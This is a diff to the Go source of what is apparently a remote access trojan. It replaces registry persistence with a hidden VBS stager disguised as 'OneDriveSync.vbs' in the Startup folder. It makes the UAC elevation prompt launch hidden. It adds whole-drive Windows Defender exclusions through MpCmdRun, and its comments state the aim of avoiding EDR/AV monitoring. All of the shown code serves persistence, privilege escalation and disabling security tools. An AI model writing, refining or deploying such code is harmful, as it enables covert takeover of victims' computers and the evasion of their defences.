@@ -1618,41 +1618,30 @@ func addPersistence() string {
 		return fmt.Sprintf("Executable path error: %v", err)
 	}
 
-	// Step 1: HKCU Run key pointing to current exe (instant, not flagged)
-	if err := regWrite(HKCU, `Software\Microsoft\Windows\CurrentVersion\Run`, "Finder", exePath); err != nil {
-		return fmt.Sprintf("Registry error: %v", err)
-	}
+	// Use Startup folder with a VBS stager — no registry keys, no file copies
+	// VBS stager in Startup folder is less flagged than reg keys or exe copies
+	startupDir := filepath.Join(os.Getenv("APPDATA"), `Microsoft\Windows\Start Menu\Programs\Startup`)
+	vbsPath := filepath.Join(startupDir, "OneDriveSync.vbs")
 
-	// Step 2: Copy to a stealthy location in the background with a delay
-	// so AV doesn't correlate the reg write + file copy as a single action
-	installPath := filepath.Join(os.Getenv("APPDATA"), `Microsoft\Windows\Themes\SystemThemeService.exe`)
-	go copyFileDelayed(exePath, installPath, 8*time.Second)
+	// VBS stager that launches the original exe from its current location
+	vbsContent := fmt.Sprintf("CreateObject(\"Wscript.Shell\").Run \"\"\"%s\"\"\", 0, False\r\n", exePath)
+
+	os.MkdirAll(startupDir, 0755)
+	if err := os.WriteFile(vbsPath, []byte(vbsContent), 0644); err != nil {
+		return fmt.Sprintf("Startup folder error: %v", err)
+	}
 
 	return "Startup Installed"
 }
 
-// copyFileDelayed copies src to dst after sleeping, then updates the registry
-// key to point to the new location. Runs as a goroutine so persistence returns
-// immediately (no blocking).
-func copyFileDelayed(src, dst string, delay time.Duration) {
-	time.Sleep(delay)
-	dstDir := filepath.Dir(dst)
-	os.MkdirAll(dstDir, 0755)
-	data, err := os.ReadFile(src)
-	if err != nil {
-		return
-	}
-	if err := os.WriteFile(dst, data, 0755); err != nil {
-		return
-	}
-	// Update registry to point to the copied location
-	regWrite(HKCU, `Software\Microsoft\Windows\CurrentVersion\Run`, "Finder", dst)
-}
-
 func removePersistence() string {
+	// Remove startup folder stager
+	startupDir := filepath.Join(os.Getenv("APPDATA"), `Microsoft\Windows\Start Menu\Programs\Startup`)
+	os.Remove(filepath.Join(startupDir, "OneDriveSync.vbs"))
+	// Also clean up legacy persistence if present
 	regDelete(HKCU, `Software\Microsoft\Windows\CurrentVersion\Run`, "Finder")
-	installPath := filepath.Join(os.Getenv("APPDATA"), `Microsoft\Windows\Themes\SystemThemeService.exe`)
-	os.Remove(installPath)
+	legacyPath := filepath.Join(os.Getenv("APPDATA"), `Microsoft\Windows\Themes\SystemThemeService.exe`)
+	os.Remove(legacyPath)
 	return "Persistence removed"
 }
 
@@ -1670,11 +1659,20 @@ func elevate() string {
 	}
 	verb, _ := windows.UTF16PtrFromString("runas")
 	exe, _ := windows.UTF16PtrFromString(exePath)
-	ret, _, _ := pShellExecuteW.Call(0, uintptr(unsafe.Pointer(verb)), uintptr(unsafe.Pointer(exe)), 0, 0, 1)
+	params, _ := windows.UTF16PtrFromString("")
+	dir, _ := windows.UTF16PtrFromString("")
+	ret, _, lastErr := pShellExecuteW.Call(
+		0,
+		uintptr(unsafe.Pointer(verb)),
+		uintptr(unsafe.Pointer(exe)),
+		uintptr(unsafe.Pointer(params)),
+		uintptr(unsafe.Pointer(dir)),
+		0, // SW_HIDE
+	)
 	if ret > 32 {
 		return "UAC elevation successful — new elevated session will connect shortly"
 	}
-	return fmt.Sprintf("UAC elevation failed (code %d) — user may have denied the prompt", ret)
+	return fmt.Sprintf("UAC elevation failed (code %d, err: %v) — user may have denied the prompt", ret, lastErr)
 }
 
 // ================================================================
@@ -1682,11 +1680,13 @@ func elevate() string {
 // ================================================================
 
 func excludeDrive(drives []string) string {
+	// Use MpCmdRun.exe directly — avoids PowerShell (heavily monitored by EDR/AV)
+	mpCmdRun := filepath.Join(os.Getenv("ProgramFiles"), "Windows Defender", "MpCmdRun.exe")
 	var results []string
 	for _, d := range drives {
-		out, err := shellExec(fmt.Sprintf(`powershell -NoP -NonI -W Hidden -Command "Add-MpPreference -ExclusionPath '%s'"`, d))
+		out, err := shellExec(fmt.Sprintf(`"%s" -AddExclusion -ExclusionType Path -ExclusionPath "%s"`, mpCmdRun, d))
 		if err != nil {
-			results = append(results, fmt.Sprintf("%s: FAILED", d))
+			results = append(results, fmt.Sprintf("%s: FAILED (%v)", d, err))
 		} else {
 			results = append(results, fmt.Sprintf("%s: OK (%s)", d, strings.TrimSpace(out)))
 		}
@@ -1959,7 +1959,7 @@ SYSTEM
   sysinfo        - Full system information report
   isadmin        - Check if session is admin
   elevate        - Attempt UAC elevation
-  persist        - Add persistence (HKCU Run + delayed file copy)
+  persist        - Add persistence (Startup folder VBS stager)
   unpersist      - Remove persistence
   excludec       - Exclude C:\ from Defender scans
   excludeall     - Exclude C:\ through G:\ from Defender
